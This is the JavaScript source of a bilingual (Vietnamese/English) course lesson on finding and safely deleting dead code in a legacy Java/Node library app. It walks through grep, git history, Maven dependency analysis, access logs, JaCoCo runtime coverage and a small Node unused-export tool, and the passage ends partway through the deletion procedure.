/**
 * Đọc code cũ và refactor — Chương 6: Code chết, thư viện cũ và nợ bảo mật (soạn 24/11/2026, agent rfc trên máy nhà Linux).
 * 6.1 code chết (bằng chứng tĩnh: git grep, git log, mvn dependency:analyze báo nhầm jstl/mysql; bằng chứng lúc chạy: access log Tomcat,
 *     JaCoCo agent gắn vào Tomcat — ExportServlet 0/2, findById 0, nhưng cũng "chết giả" GV/KHACH/xoaSach; Node: script export-chet.js
 *     1 đúng + 2 báo nhầm require động + 1 bỏ sót; Knight Capital 2012; xoá trong commit riêng TV-103)
 * 6.2 thư viện cũ (npm audit 24 lỗ hổng production ⇒ 0 sau express 4.22.3 + moment 2.31.0; thử khai thác qs CVE-2022-24999 trên chính API:
 *     200 trong 4 ms ⇒ không chạm tới được; request bị bỏ: 3 cảnh báo deprecated + 7 lỗ hổng; Maven versions plugin và các bẫy;
 *     OWASP Dependency-Check 13.0.0: log4j 1.2.17 sáu CVE, Connector/J 5.1.49 hai CVE; Equifax 2017)
 * 6.3 góc hacker (tan-cong.sh 9 đòn trên bản lab: vượt đăng nhập, UNION, error-based, blind theo thời gian, xoá ẩn, XSS hai loại,
 *     cookie giả, mật khẩu thô; TV-102 test tấn công đỏ trước rồi PreparedStatement; CWE-209; Html.thoat; TV-105 PBKDF2 + nâng cấp dần
 *     + migration + băm một lượt; collation _ci làm "ADMIN123" vào được; Heartland 2008, TalkTalk 2015, RockYou 2009, LinkedIn 2012, Samy 2005)
 * 6.4 lab (12 commit Java 33 ⇒ 49 test, 1 commit Node; reload4j 1.2.27, Connector/J 9.7.0 vẫn 4 CVE ⇒ 26.10.0; ODC 8 ⇒ 0; golden master giống hệt)
 * 6.5 quiz 12 câu.
 * Repo: legacy-thu-vien nhánh ch6, legacy-express nhánh ch6. Lời giải: lab/loi-giai/ch6/ (git format-patch + tools + tan-cong.sh).
 * KHÔNG dạy lại: bảo mật web chuyên sâu (web-security), PasswordEncoder Spring (spring-boot 9.2), đổi hàm băm (authentication 2.5),
 * chuỗi cung ứng npm (nodejs 4.3), so sánh công cụ SCA (devsecops 4.2).
 */
import { java, xml, bash, js, out, tl, giai, ml, lk, bai, thuatNgu, Q, MOI_TRUONG_3 } from './_chung.mjs';

const moiTruong = (en) => `<p><em>${en ? 'Outputs run for real on:' : 'Output chạy thật trên:'} ${MOI_TRUONG_3} · npm 6.14.18 · OWASP Dependency-Check 13.0.0 (JDK 21) · JaCoCo 0.8.12.</em></p>`;
const tlJetBrains = (en) => tl('https://www.jetbrains.com/help/idea/safe-delete.html', '📘', 'IntelliJ IDEA — Safe delete', en ? 'Deletes only after searching usages (incl. strings, comments)' : 'Chỉ xoá sau khi tìm nơi dùng (kể cả trong chuỗi, chú thích)');
const academy = (mon, slug) => `/academy/courses/${mon}/learn?lessonSlug=${slug}`;

/* ═══════════════════ 6.1 — Code chết ═══════════════════ */
const O61_GREP = out(`
$ git grep -n "ExportServlet" ch5 -- src/main
src/main/java/com/thuvien/servlet/ExportServlet.java:19:public class ExportServlet extends HttpServlet {
src/main/webapp/WEB-INF/web.xml:37:    <servlet-name>ExportServlet</servlet-name>
src/main/webapp/WEB-INF/web.xml:38:    <servlet-class>com.thuvien.servlet.ExportServlet</servlet-class>
src/main/webapp/WEB-INF/web.xml:41:    <servlet-name>ExportServlet</servlet-name>
$ git grep -n "ReportServlet" ch5 -- src/main
src/main/java/com/thuvien/servlet/ReportServlet.java:21:public class ReportServlet extends HttpServlet {
`);
const O61_LOG = out(`
$ git log --format="%h %ad %an  %s" --date=short master -- src/main/webapp/WEB-INF/web.xml
e505b01 2019-11-05 Le Thi Lan  update
c50e9ac 2018-01-08 Nguyen Anh Tuan  tam tat export, server moi chay linux khong co o C
27b41a4 2017-10-10 Tran Quoc Hung  xuat csv cho ke toan
d48c4bb 2016-03-15 Nguyen Anh Tuan  them chuc nang doc gia
1133063 2016-03-02 Nguyen Anh Tuan  init project
$ git show c50e9ac
c50e9ac Nguyen Anh Tuan 2018-01-08
    tam tat export, server moi chay linux khong co o C

@@ -32,6 +32,7 @@
     <url-pattern>/readers</url-pattern>
   </servlet-mapping>

+  <!-- tam tat 2018
   <servlet>
     <servlet-name>ExportServlet</servlet-name>
     <servlet-class>com.thuvien.servlet.ExportServlet</servlet-class>
@@ -40,6 +41,7 @@
     <servlet-name>ExportServlet</servlet-name>
     <url-pattern>/export</url-pattern>
`);
const O61_GREP2 = out(`
$ git grep -n "findById\\|PAGE_SIZE\\|DATE_FORMAT" ch5 -- src
src/main/java/com/thuvien/dao/BookDAO.java:37:    public Book findById(int id) {
src/main/java/com/thuvien/util/Constants.java:5:    public static final int PAGE_SIZE = 20;          // khong ai dung
src/main/java/com/thuvien/util/Constants.java:6:    public static final String DATE_FORMAT = "dd/MM/yyyy";
`);
const O61_ANALYZE = out(`
$ mvn -B dependency:analyze
...
[WARNING] Used undeclared dependencies found:
[WARNING]    org.mockito:mockito-core:jar:4.11.0:test
[WARNING]    org.junit.jupiter:junit-jupiter-api:jar:5.11.4:test
[WARNING] Unused declared dependencies found:
[WARNING]    javax.servlet.jsp:javax.servlet.jsp-api:jar:2.3.1:provided
[WARNING]    javax.servlet:jstl:jar:1.2:compile
[WARNING]    mysql:mysql-connector-java:jar:5.1.49:compile
[WARNING]    org.junit.jupiter:junit-jupiter:jar:5.11.4:test
[WARNING]    org.mockito:mockito-junit-jupiter:jar:4.11.0:test
[WARNING]    org.junit.vintage:junit-vintage-engine:jar:5.11.4:test
[INFO] BUILD SUCCESS
`);
const C61_COMPOSE = xml(`
# compose.jacoco.yml — gắn JaCoCo agent vào Tomcat lab (lời giải: lab/loi-giai/ch6/tools/)
services:
  web:
    environment:
      CATALINA_OPTS: "-javaagent:/jacoco/org.jacoco.agent-0.8.12-runtime.jar=destfile=/jacoco/thuvien.exec,includes=com.thuvien.*"
    volumes:
      - ./jacoco:/jacoco
`);
const O61_CHAY = out(`
$ docker compose -f docker-compose.yml -f compose.jacoco.yml up -d --build web
$ docker logs lgc-thuvien-web-1 2>&1 | grep javaagent
... Command line argument: -javaagent:/jacoco/org.jacoco.agent-0.8.12-runtime.jar=destfile=/jacoco/thuvien.exec,includes=com.thuvien.*
$ bash tools/mot-ngay.sh          # 12 request: mọi chức năng có trên menu, như thủ thư dùng một ngày
200 login
200 login
302 login
200 books
200 books?q=java
302 books
302 books
302 books
200 readers
302 readers
200 report?days=1
302 login?action=logout
$ curl -s -o /dev/null -w "%{http_code} export\\n" $B/export
404 export
`);
const O61_ACCESS = out(`
$ docker exec lgc-thuvien-web-1 sh -c 'cat logs/localhost_access_log.*.txt' \\
    | awk '{split($7,u,"?"); print $6, u[1], $9}' | tr -d '"' | sort | uniq -c | sort -rn
      3 POST /thuvien/books 302
      2 GET /thuvien/books 200
      1 POST /thuvien/readers 302
      1 POST /thuvien/login 302
      1 POST /thuvien/login 200
      1 GET /thuvien/report 200
      1 GET /thuvien/readers 200
      1 GET /thuvien/login 302
      1 GET /thuvien/login 200
      1 GET /thuvien/export 404
`);
const O61_JACOCO = out(`
$ docker compose stop web                      # agent ghi thuvien.exec khi JVM tắt êm
$ mvn -B -q compile org.jacoco:jacoco-maven-plugin:0.8.12:report -Djacoco.dataFile=target/thuvien-chay.exec
$ python3 tools/ham-chua-chay.py target/site/jacoco/jacoco.xml
# JaCoCo sau mot-ngay.sh (12 request) — lớp: hàm đã chạy/tổng · hàm CHƯA chạy lần nào
servlet.ReportServlet          2/2
servlet.ReaderServlet          3/3
servlet.ExportServlet          0/2  <init>, doGet
servlet.BookServlet            10/11  xoaSach
servlet.LoginServlet           4/4
service.MuonTraService         3/3
model.Tien                     8/11  toString, equals, hashCode
model.LoaiDocGia$3             1/4  toiDa, soNgayMuon, phiMoiNgay
model.LoaiDocGia$2             1/4  toiDa, soNgayMuon, phiMoiNgay
dao.BookDAO                    3/4  findById
dao.PhieuMuonDAO               8/8
util.TokenUtil                 1/2  <init>
...
`);
const O61_NODE_THAT = out(`
$ node export-chet.js .            # legacy-express, nhánh ch6
# Tệp không ai require (trừ điểm vào "server.js" và test):
(không có)
# Export không tệp nào khác dùng (chỉ test dùng thì ghi "chỉ test"):
(không có)
`);
const C61_APP_THU = js(`
// app.js của BẢN THÍ NGHIỆM (không phải repo lab): thêm lib/xuat-excel.js (không ai dùng),
// lib/dinh-dang.js { ngayVN, tienVN } (tienVN không ai dùng), và gắn route bằng require ĐỘNG
var express = require('express');
var dinhDang = require('./lib/dinh-dang');
var app = express();
['phieu', 'muon'].forEach(function (ten) { app.use('/api/' + ten, require('./routes/' + ten)); });
app.get('/api/hom-nay', function (req, res) { res.json({ ngay: dinhDang.ngayVN(new Date().toISOString().slice(0, 10)) }); });
module.exports = app;
`);
const O61_NODE_THU = out(`
$ node export-chet.js .      # bản thí nghiệm
# Tệp không ai require (trừ điểm vào "server.js" và test):
lib/xuat-excel.js
routes/muon.js
routes/phieu.js
# Export không tệp nào khác dùng (chỉ test dùng thì ghi "chỉ test"):
lib/xuat-excel.js: xuatPhieu
$ grep -rn 'tienVN' --include='*.js' --exclude-dir=node_modules .
lib/dinh-dang.js:1:module.exports = { ngayVN: function (d) { return d.split('-').reverse().join('/'); }, tienVN: function (n) { return n + ' d'; } };
`);
const O61_XOA = out(`
$ mvn -B -o test | grep 'Tests run:' | tail -1      # trước khi xoá
[INFO] Tests run: 33, Failures: 0, Errors: 0, Skipped: 0
$ git rm -q src/main/java/com/thuvien/servlet/ExportServlet.java \\
         src/test/java/com/thuvien/servlet/ExportServletDacTaTest.java \\
         src/test/java/com/thuvien/servlet/ExportServletDacTaTest.xuatCsvSach.approved.txt
$ # + xoá khối <!-- tam tat 2018 … --> trong web.xml và Constants.EXPORT_DIR
$ mvn -B -o test | grep 'Tests run:' | tail -1
[INFO] Tests run: 32, Failures: 0, Errors: 0, Skipped: 0
$ git show --stat --format='%h %s' HEAD
29c012e chore(6.1): xoa ExportServlet chet tu 2018 (TV-103)

 .../java/com/thuvien/servlet/ExportServlet.java    | 42 ----------------------
 src/main/java/com/thuvien/util/Constants.java      |  1 -
 src/main/webapp/WEB-INF/web.xml                    | 10 ------
 .../thuvien/servlet/ExportServletDacTaTest.java    | 29 ---------------
 ...ExportServletDacTaTest.xuatCsvSach.approved.txt |  7 ----
 5 files changed, 89 deletions(-)
`);
const O61_MSG = out(`
chore(6.1): xoa ExportServlet chet tu 2018 (TV-103)

Bang chung: web.xml da comment tu c50e9ac (2018-01-08), GET /export tra 404
trong access log, JaCoCo luc chay 0/2 ham; ke toan xac nhan da dung bao cao ERP (TV-103).
Xoa kem: test dac ta, file approved, khoi web.xml da comment, Constants.EXPORT_DIR.
Khoi phuc neu can: git revert <commit nay>.
`);

const L61 = ml((en) => `
<span class="eyebrow">${en ? 'Chapter 6 · Dead code, old libraries and security debt' : 'Chương 6 · Code chết, thư viện cũ và nợ bảo mật'}</span>
<h2>${en ? '6.1 — Finding and deleting dead code safely' : '6.1 — Tìm và xoá code chết an toàn'}</h2>
<p class="lead">${en
  ? 'An old house has wires in the walls that nobody can explain. Some are dead. Some still feed the doorbell. The electrician does not rip them all out on a hunch — she switches off one breaker, checks what goes dark, labels it, and only then cuts. Dead code is those wires: it costs you every time you read, search, upgrade or audit, and once in a while a “dead” wire turns out to be live. This lesson is about collecting evidence before you cut.'
  : 'Nhà cũ có những sợi dây điện âm tường không ai giải thích được. Có sợi chết thật. Có sợi vẫn nuôi cái chuông cửa. Thợ điện giỏi không giật hết theo cảm giác — họ ngắt từng cầu dao, xem chỗ nào tắt, dán nhãn, rồi mới cắt. Code chết chính là những sợi dây đó: tốn công mỗi lần bạn đọc, tìm, nâng cấp hay kiểm tra bảo mật, và thỉnh thoảng một sợi "chết" hoá ra vẫn có điện. Bài này dạy gom bằng chứng trước khi cắt.'}</p>
${moiTruong(en)}

<h3>${en ? 'What counts as dead code' : 'Thế nào là code chết'}</h3>
<p>${en
  ? 'Fowler’s catalogue calls the cure <em>Remove Dead Code</em> and gives one line of motivation: if it is not used, it is noise, and version control remembers it if you were wrong. In a legacy repository dead code comes in more shapes than “a method nobody calls”. Each shape below exists in <code>legacy-thu-vien</code> after Chapter 5:'
  : 'Danh mục của Fowler gọi cách chữa là <em>Remove Dead Code</em> với một câu lý do: không dùng thì là nhiễu, và nếu bạn nhầm thì hệ quản lý phiên bản vẫn nhớ. Trong một repo cũ, code chết có nhiều hình dạng hơn "một hàm không ai gọi". Mỗi dạng dưới đây đều có trong <code>legacy-thu-vien</code> sau Chương 5:'}</p>
<table>
<tr><th>${en ? 'Shape' : 'Dạng'}</th><th>${en ? 'Example in the lab' : 'Ví dụ trong lab'}</th><th>${en ? 'Why tools miss or misreport it' : 'Vì sao công cụ dễ bỏ sót / báo nhầm'}</th></tr>
<tr><td>${en ? 'Unmapped entry point' : 'Điểm vào không còn gắn'}</td><td><code>ExportServlet</code> — ${en ? 'its &lt;servlet&gt; block in web.xml is commented out since 2018' : 'khối &lt;servlet&gt; trong web.xml bị comment từ 2018'}</td><td>${en ? 'The class compiles, has a test, and grep finds its name in web.xml' : 'Lớp vẫn biên dịch, còn có test, grep vẫn thấy tên nó trong web.xml'}</td></tr>
<tr><td>${en ? 'Unused method / constant' : 'Hàm / hằng không ai dùng'}</td><td><code>BookDAO.findById</code>, <code>Constants.PAGE_SIZE</code>, <code>DATE_FORMAT</code></td><td>${en ? 'Public members: the compiler cannot know no other jar calls them' : 'Thành viên public: trình biên dịch không biết jar khác có gọi không'}</td></tr>
<tr><td>${en ? 'Feature with no UI' : 'Chức năng không có nút'}</td><td><code>BookServlet.xoaSach</code> — ${en ? 'action=delete, no button in any JSP since 2016' : 'action=delete, không JSP nào có nút từ 2016'}</td><td>${en ? 'Reachable by anyone who sends the POST — dead for users, alive for attackers (lesson 6.3)' : 'Ai gửi POST là gọi được — chết với người dùng, sống với kẻ tấn công (bài 6.3)'}</td></tr>
<tr><td>${en ? 'Commented-out code' : 'Code bị comment'}</td><td>${en ? 'the web.xml block above' : 'khối web.xml ở trên'}</td><td>${en ? 'Invisible to compilers and coverage; visible to every reader' : 'Trình biên dịch và độ phủ không thấy; người đọc nào cũng thấy'}</td></tr>
<tr><td>${en ? 'Unused dependency' : 'Thư viện khai báo mà không dùng'}</td><td>${en ? '(none for real — see the false alarms below)' : '(thật ra không có — xem báo nhầm bên dưới)'}</td><td>${en ? 'Bytecode analysis cannot see JSP taglibs or Class.forName' : 'Phân tích bytecode không thấy taglib JSP hay Class.forName'}</td></tr>
<tr><td>${en ? 'Dead data / DB objects' : 'Dữ liệu / đối tượng CSDL chết'}</td><td>${en ? 'the books.csv the export used to write to C:\\' : 'tệp books.csv mà export từng ghi vào ổ C:\\'}</td><td>${en ? 'Lives outside the repository' : 'Nằm ngoài repo'}</td></tr>
</table>

<h3>${en ? 'Why bother: Knight Capital, 1 August 2012' : 'Vì sao phải dọn: Knight Capital, 1/8/2012'}</h3>
<p>${en
  ? 'Knight Capital, then one of the largest US equity market makers, deployed new code for a NYSE retail programme to eight servers. The new code re-used a flag that, years earlier, had switched on an old function called <em>Power Peg</em> — code that had not been used since 2003 but was never deleted. One server did not receive the new version. When the flag went live, that server ran Power Peg against real orders: in about 45 minutes Knight sent millions of orders and lost roughly USD 460 million. The SEC order (Release No. 34-70694, October 2013 — the same document cited in the Start Here lesson) describes the dead code, the re-used flag and the missing deployment check. Dead code is not harmless clutter; it is a loaded path waiting for a trigger.'
  : 'Knight Capital, khi đó là một trong những công ty tạo lập thị trường cổ phiếu lớn nhất nước Mỹ, triển khai code mới cho một chương trình của sàn NYSE lên tám máy chủ. Code mới dùng lại một cờ (flag) mà nhiều năm trước từng bật một chức năng cũ tên <em>Power Peg</em> — code không ai dùng từ 2003 nhưng chưa bao giờ bị xoá. Một máy chủ không nhận bản mới. Khi cờ được bật, máy đó chạy Power Peg trên lệnh thật: trong khoảng 45 phút Knight gửi hàng triệu lệnh và lỗ chừng 460 triệu USD. Quyết định của SEC (Release No. 34-70694, tháng 10/2013 — cùng tài liệu đã dẫn ở bài Bắt đầu tại đây) mô tả rõ code chết, cờ bị dùng lại và bước kiểm tra triển khai bị thiếu. Code chết không phải rác vô hại; nó là một đường chạy đã nạp đạn, chờ cò.'}</p>

<h3>${en ? 'Static evidence 1: search — and read what the search actually found' : 'Bằng chứng tĩnh 1: tìm kiếm — và đọc kỹ thứ nó tìm thấy'}</h3>
${O61_GREP}
<p>${en
  ? 'Two traps in six lines. <code>ExportServlet</code> appears in web.xml, so a quick reader concludes “it is mapped”. <code>ReportServlet</code> does <em>not</em> appear in web.xml, so a quick reader concludes “it is dead” — yet it is the overdue report on the menu, mapped by the <code>@WebServlet("/report")</code> annotation (Servlet 3.0+). In Java web code an entry point can live in web.xml, an annotation, a JSP <code>&lt;form action&gt;</code>, a Spring <code>@RequestMapping</code>, a scheduler, a JMX bean or a reflective <code>Class.forName</code> — grep the class name, then grep every way the framework can reach it.'
  : 'Hai cái bẫy trong sáu dòng. <code>ExportServlet</code> có mặt trong web.xml, người đọc vội kết luận "nó đang được gắn". <code>ReportServlet</code> <em>không</em> có trong web.xml, người đọc vội kết luận "nó chết" — trong khi đó chính là báo cáo quá hạn trên menu, gắn bằng chú thích <code>@WebServlet("/report")</code> (Servlet 3.0 trở lên). Trong web Java, một điểm vào có thể nằm ở web.xml, ở chú thích, ở <code>&lt;form action&gt;</code> của JSP, ở <code>@RequestMapping</code> của Spring, ở bộ lập lịch, ở JMX hay ở <code>Class.forName</code> qua phản chiếu — tìm tên lớp, rồi tìm mọi đường mà framework có thể chạm tới nó.'}</p>

<h3>${en ? 'Static evidence 2: history tells you why' : 'Bằng chứng tĩnh 2: lịch sử cho biết vì sao'}</h3>
${O61_LOG}
<p>${en
  ? '“Temporarily disabled, the new server runs Linux and has no C: drive” — written by Tuấn in January 2018. Now you know three things: it was switched off on purpose, the reason was technical (the hard-coded <code>C:\\thuvien\\export\\</code> path), and the business need (accounting wanted a CSV) may still exist. The last point is not something code can answer. It becomes a question to the customer.'
  : '"Tạm tắt export, server mới chạy Linux không có ổ C" — anh Tuấn viết tháng 1/2018. Giờ bạn biết ba điều: nó bị tắt có chủ đích, lý do là kỹ thuật (đường cứng <code>C:\\thuvien\\export\\</code>), và nhu cầu nghiệp vụ (kế toán cần CSV) có thể vẫn còn. Điều cuối không có dòng code nào trả lời được. Nó trở thành một câu hỏi gửi khách.'}</p>
${O61_GREP2}
<p>${en
  ? 'For members, “only the declaration matches” is strong evidence inside a single WAR. Two cautions. Public members of a <em>library</em> jar may be used by other projects you cannot grep. And <code>static final</code> primitives and strings are compile-time constants: <code>javac</code> copies their value into every caller, so after deleting <code>PAGE_SIZE</code> an old caller compiled earlier would keep running with 20 — the breakage only appears the next time that caller is recompiled. In a single WAR built from source, this does not bite; in a multi-module company codebase it does.'
  : 'Với thành viên của lớp, "chỉ có dòng khai báo khớp" là bằng chứng mạnh trong phạm vi một WAR. Hai điều cần cẩn thận. Thành viên public của một jar <em>thư viện</em> có thể được dự án khác dùng mà bạn không grep được. Và hằng <code>static final</code> kiểu nguyên thuỷ hoặc String là hằng lúc biên dịch: <code>javac</code> chép giá trị vào từng nơi gọi, nên sau khi xoá <code>PAGE_SIZE</code>, một nơi gọi đã biên dịch từ trước vẫn chạy với 20 — lỗi chỉ lộ ra lần sau nơi đó được biên dịch lại. Trong một WAR dựng từ nguồn thì không sao; trong codebase nhiều module của công ty thì có.'}</p>

<h3>${en ? 'Static evidence 3: tools that report “unused” — and lie' : 'Bằng chứng tĩnh 3: công cụ báo "không dùng" — và báo sai'}</h3>
${O61_ANALYZE}
<p>${en
  ? 'The Maven Dependency Plugin reads bytecode. It says <code>jstl</code> and <code>mysql-connector-java</code> are unused. Delete them and the application dies: <code>report.jsp</code> uses the JSTL <code>&lt;c:forEach&gt;</code> tag (JSPs are compiled by Tomcat at runtime, not by Maven), and the MySQL driver is loaded by name from <code>db.properties</code> through <code>Class.forName</code>. The test-scope lines are noise of a different kind: <code>junit-jupiter</code> is an aggregator, used through its children. Treat every “unused” from a tool as a <em>candidate</em>, never as a verdict.'
  : 'Maven Dependency Plugin đọc bytecode. Nó nói <code>jstl</code> và <code>mysql-connector-java</code> không dùng. Xoá đi là ứng dụng chết: <code>report.jsp</code> dùng thẻ JSTL <code>&lt;c:forEach&gt;</code> (JSP do Tomcat biên dịch lúc chạy, Maven không thấy), còn driver MySQL được nạp theo tên từ <code>db.properties</code> qua <code>Class.forName</code>. Mấy dòng phạm vi test là nhiễu kiểu khác: <code>junit-jupiter</code> là gói gom, được dùng qua các gói con. Mọi chữ "không dùng" do công cụ báo chỉ là <em>ứng viên</em>, không phải phán quyết.'}</p>
<p>${en
  ? 'In IntelliJ IDEA the same job is the <em>Unused declaration</em> inspection (Code → Inspect Code) and the <em>Safe Delete</em> refactoring (Alt+Delete), which searches usages — including in strings and comments if you tick the box — before deleting. The home machine of this course has no GUI, so there is no IntelliJ screenshot here; the JetBrains docs page is linked below. The logic is identical: the IDE sees the Java world, not Tomcat’s.'
  : 'Trong IntelliJ IDEA, việc này là inspection <em>Unused declaration</em> (Code → Inspect Code) và phép refactor <em>Safe Delete</em> (Alt+Delete) — nó tìm nơi dùng, kể cả trong chuỗi và chú thích nếu bạn tích ô đó, trước khi xoá. Máy chạy khoá học không có giao diện đồ hoạ nên ở đây không có ảnh chụp IntelliJ; trang tài liệu JetBrains có ở cuối bài. Logic như nhau: IDE thấy thế giới Java, không thấy thế giới của Tomcat.'}</p>

<h3>${en ? 'Runtime evidence 1: the access log' : 'Bằng chứng lúc chạy 1: access log'}</h3>
<p>${en
  ? 'Static analysis answers “can anything call this?”. Production answers “did anything call this?”. The cheapest runtime evidence is the web server’s access log — Tomcat writes one by default (<code>AccessLogValve</code> in <code>server.xml</code>). On a real project you ask the customer for 30–90 days of it, covering at least one month-end. Here we simulate a working day with <code>tools/mot-ngay.sh</code>:'
  : 'Phân tích tĩnh trả lời "có thứ gì gọi được cái này không?". Production trả lời "có thứ gì đã gọi cái này chưa?". Bằng chứng lúc chạy rẻ nhất là access log của web server — Tomcat ghi sẵn (<code>AccessLogValve</code> trong <code>server.xml</code>). Ở dự án thật, bạn xin khách 30–90 ngày log, phủ ít nhất một lần cuối tháng. Ở đây ta giả lập một ngày làm việc bằng <code>tools/mot-ngay.sh</code>:'}</p>
${O61_CHAY}
${O61_ACCESS}
<p>${en
  ? 'The only request to <code>/export</code> is ours, and it got a 404: the URL is not mapped, so nothing in production can reach <code>ExportServlet</code>. That is evidence for the endpoint. It says nothing about methods inside servlets that <em>are</em> reached.'
  : 'Request duy nhất tới <code>/export</code> là của ta, và nhận 404: URL không được gắn, nên không gì ở production chạm được <code>ExportServlet</code>. Đó là bằng chứng cho điểm vào. Nó không nói gì về các hàm bên trong những servlet <em>có</em> được gọi.'}</p>

<h3>${en ? 'Runtime evidence 2: a coverage agent in the running server' : 'Bằng chứng lúc chạy 2: gắn công cụ đo độ phủ vào server đang chạy'}</h3>
<p>${en
  ? 'JaCoCo is usually run with unit tests, but its agent works on any JVM. Attach it to Tomcat, use the application, stop Tomcat cleanly, and you get coverage of <em>real usage</em> per method. Teams do this on a staging server for a sprint, or on one production node for a month (the agent overhead is small but measure it first).'
  : 'JaCoCo thường chạy cùng unit test, nhưng agent của nó gắn được vào bất kỳ JVM nào. Gắn vào Tomcat, dùng ứng dụng, tắt Tomcat êm, và bạn có độ phủ của <em>việc dùng thật</em> theo từng hàm. Các nhóm làm việc này trên máy staging trong một sprint, hoặc trên một node production trong một tháng (agent tốn ít tài nguyên nhưng hãy đo trước).'}</p>
${C61_COMPOSE}
${O61_JACOCO}
<p>${en
  ? 'Read this table with suspicion in both directions:'
  : 'Đọc bảng này với sự nghi ngờ theo cả hai chiều:'}</p>
<ul>
<li>${en ? '<strong>Confirmed:</strong> <code>ExportServlet 0/2</code> — not even the constructor ran; Tomcat never instantiated it. <code>BookDAO.findById</code> never ran and grep found no caller. Two independent kinds of evidence agree.' : '<strong>Khẳng định:</strong> <code>ExportServlet 0/2</code> — đến hàm dựng cũng không chạy; Tomcat chưa từng tạo nó. <code>BookDAO.findById</code> chưa chạy và grep không thấy nơi gọi. Hai loại bằng chứng độc lập cùng nói một điều.'}</li>
<li>${en ? '<strong>False alarms:</strong> <code>LoaiDocGia$2/$3</code> (lecturer and guest rules) did not run only because our “day” borrowed with a student. <code>Tien.equals/hashCode/toString</code> are used by tests and by any future <code>HashMap</code>. A short window means many false alarms — a yearly report run every 31 December looks dead for 364 days.' : '<strong>Báo nhầm:</strong> <code>LoaiDocGia$2/$3</code> (luật giảng viên và khách) không chạy chỉ vì "ngày" của ta mượn bằng sinh viên. <code>Tien.equals/hashCode/toString</code> được test dùng và sẽ được bất kỳ <code>HashMap</code> nào dùng. Cửa sổ đo ngắn thì báo nhầm nhiều — một báo cáo chạy mỗi 31/12 trông như chết suốt 364 ngày.'}</li>
<li>${en ? '<strong>The interesting one:</strong> <code>BookServlet.xoaSach</code> never ran, and no JSP has a button for it. But anyone with a session can POST <code>action=delete</code>. It is dead for users and alive for attackers — and it concatenates SQL. Lesson 6.3 attacks it; the lab deletes it, after asking the customer.' : '<strong>Cái đáng chú ý:</strong> <code>BookServlet.xoaSach</code> chưa từng chạy, và không JSP nào có nút gọi nó. Nhưng ai có phiên đăng nhập cũng POST được <code>action=delete</code>. Nó chết với người dùng mà sống với kẻ tấn công — lại còn nối chuỗi SQL. Bài 6.3 tấn công nó; lab xoá nó, sau khi hỏi khách.'}</li>
</ul>

<h3>${en ? 'The Node side: a 50-line tool, and why real tools use a parser' : 'Bên Node: một công cụ 50 dòng, và vì sao công cụ thật dùng bộ phân tích cú pháp'}</h3>
<p>${en
  ? 'For JavaScript the well-known tools are <strong>knip</strong> (unused files, exports and dependencies; understands many frameworks) and <strong>ts-prune</strong> (unused TypeScript exports). They are not installed on this course’s machine, so instead we read and run <code>lab/loi-giai/ch6/tools/export-chet.js</code>: it lists files nobody <code>require</code>s and names in <code>module.exports = { … }</code> that no other file mentions. On the real repo after Chapter 5 it finds nothing — Chapter 5 already removed the dead parameter:'
  : 'Với JavaScript, công cụ quen thuộc là <strong>knip</strong> (tệp, export và thư viện không dùng; hiểu nhiều framework) và <strong>ts-prune</strong> (export TypeScript không dùng). Máy của khoá học chưa cài chúng, nên ta đọc và chạy <code>lab/loi-giai/ch6/tools/export-chet.js</code>: nó liệt kê tệp không ai <code>require</code> và tên trong <code>module.exports = { … }</code> mà không tệp nào khác nhắc tới. Trên repo thật sau Chương 5 nó không thấy gì — Chương 5 đã bỏ tham số chết:'}</p>
${O61_NODE_THAT}
<p>${en
  ? 'To see how such a tool fails, we ran it on a throw-away experiment copy (not the lab repo) with three changes:'
  : 'Để thấy công cụ kiểu này sai ở đâu, ta chạy nó trên một bản sao thí nghiệm bỏ đi được (không phải repo lab) với ba thay đổi:'}</p>
${C61_APP_THU}
${O61_NODE_THU}
<ul>
<li>${en ? '<strong>True positive:</strong> <code>lib/xuat-excel.js</code> really is unused.' : '<strong>Đúng:</strong> <code>lib/xuat-excel.js</code> thật sự không ai dùng.'}</li>
<li>${en ? '<strong>Two false positives:</strong> both routes are loaded by <code>require(\'./routes/\' + ten)</code> — a string built at runtime. Deleting them would take the whole API down. Dynamic <code>require</code>, plugin loaders and <code>app[method]</code> defeat every static tool.' : '<strong>Hai báo nhầm:</strong> cả hai route được nạp bằng <code>require(\'./routes/\' + ten)</code> — chuỗi ghép lúc chạy. Xoá chúng là sập cả API. <code>require</code> động, bộ nạp plugin và <code>app[method]</code> đánh bại mọi công cụ tĩnh.'}</li>
<li>${en ? '<strong>One false negative:</strong> <code>tienVN</code> is unused but not reported: the regex stops at the first <code>}</code>, which belongs to the body of <code>ngayVN</code>. That is exactly why knip and ts-prune build a syntax tree instead of matching text.' : '<strong>Một bỏ sót:</strong> <code>tienVN</code> không ai dùng mà không bị báo: regex dừng ở dấu <code>}</code> đầu tiên, vốn thuộc thân hàm <code>ngayVN</code>. Đó chính là lý do knip và ts-prune dựng cây cú pháp thay vì so chữ.'}</li>
</ul>

<h3>${en ? 'Deleting safely: the procedure' : 'Xoá an toàn: quy trình'}</h3>
<ol>
<li>${en ? '<strong>Two independent kinds of evidence</strong> — one static (search, IDE, history), one runtime (logs, coverage agent, feature-flag metrics).' : '<strong>Hai loại bằng chứng độc lập</strong> — một tĩnh (tìm kiếm, IDE, lịch sử), một lúc chạy (log, agent đo phủ, số liệu của feature flag).'}</li>
<li>${en ? '<strong>Ask the owner</strong> when the question is about the business (“does accounting still need the CSV?”). Write the question with the evidence attached; in outsourcing, get the answer in the ticket.' : '<strong>Hỏi chủ nghiệp vụ</strong> khi câu hỏi thuộc về nghiệp vụ ("kế toán còn cần CSV không?"). Viết câu hỏi kèm bằng chứng; ở dự án outsourcing, lấy câu trả lời trong ticket.'}</li>
<li>${en ? '<strong>Optional tombstone</strong> for risky cases: leave the code, add a log line “tombstone: X called” and wait a release cycle. Silence for a full cycle is strong evidence.' : '<strong>Bia mộ (tuỳ chọn)</strong> cho trường hợp rủi ro: giữ code, thêm một dòng log "tombstone: X được gọi" và chờ một chu kỳ phát hành. Im lặng trọn một chu kỳ là bằng chứng mạnh.'}</li>
<li>${en ? '<strong>Delete in its own commit</strong> — never mixed with a feature or a fix (Chapter 5’s two hats). Delete the code, its tests, its config and its comments together.' : '<strong>Xoá trong commit riêng</strong> — không trộn với tính năng hay bản sửa (hai chiếc mũ của Chương 5). Xoá code, test của nó, cấu hình và chú thích liên quan cùng lúc.'}</li>
